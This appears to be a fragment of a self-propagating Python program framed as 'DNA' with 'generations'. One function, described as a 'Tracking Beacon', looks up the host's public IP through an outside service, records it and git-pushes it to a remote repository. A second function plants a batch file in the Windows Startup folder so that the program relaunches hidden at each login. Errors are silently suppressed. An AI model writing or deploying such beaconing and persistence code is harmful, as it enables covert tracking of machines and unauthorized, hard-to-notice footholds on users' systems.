import os, json, subprocess
import requests

def multiverse_migration(dna):
    """Enhanced Phase B with Tracking Beacon."""
    try:
        # Get a 'Shadow' location (External IP)
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except:
            public_ip = "Unknown_Node"

        # Update DNA with the new location signature
        dna['last_known_node'] = public_ip
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        # Git Push with the Node ID as a tracking tag
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Node-Migration: {public_ip[:5]}... | Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except Exception as e:
        return False

def establish_persistence():
    """Phase A: The Roots (Persistence)"""
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
            f.write(f"start /min pythonw {os.path.abspath('main.py')}")
        return True
    except:
        return False